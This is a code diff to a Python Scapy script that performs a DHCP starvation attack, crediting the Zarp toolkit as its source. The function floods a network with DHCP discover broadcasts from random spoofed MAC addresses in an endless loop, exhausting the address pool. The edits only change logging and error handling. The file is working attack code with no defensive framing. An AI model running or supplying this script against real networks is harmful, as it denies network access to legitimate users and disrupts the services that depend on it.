@@ -1,13 +1,12 @@
 from scapy.all import *
+import traceback
 
-'''THIS CODE IS NOT MINE! It has been borrowed from the "Zarp" program'''
+'''THIS CODE IS NOT MINE! It has been borrowed from "Zarp"
+    https://github.com/hatRiot/zarp'''
 
 def DHCPstarvation(terminal=None):
     try:
-        if terminal == None:
-            print('[+] Starving network of DHCP resources')
-        else:
-            terminal.write('\n[+] Starving network of DHCP resources')
+        terminal.write('\n[+] Starving network of DHCP resources')
         while True:
             pkt = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff")
             pkt /= IP(src="0.0.0.0", dst="255.255.255.255")
@@ -16,7 +15,5 @@ def DHCPstarvation(terminal=None):
             pkt /= DHCP(options=[("message-type", 'discover'), 'end'])
             sendp(pkt,verbose=0)
     except Exception as s:
-        if terminal == None:
-            print(s)
-        else:
-            terminal.write('\n'+str(s))
+        terminal.write('\n'+str(s))
+        traceback.print_exc()
